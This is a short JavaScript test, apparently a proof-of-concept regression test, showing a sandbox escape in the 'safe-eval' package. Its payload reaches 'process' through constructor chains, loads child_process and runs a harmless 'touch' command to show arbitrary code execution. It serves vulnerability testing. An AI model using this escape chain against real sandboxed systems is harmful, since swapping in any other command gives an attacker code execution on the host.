test("Arbitrary code execution in safe-eval", () => {
  const fs = require("fs");
  const path = "./safe-eval";

  expect.assertions(2);
  fs.unlink(path, function (err) {});
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var safeEval = require("safe-eval");

  try {
       safeEval(` import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('touch ${path}') `);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
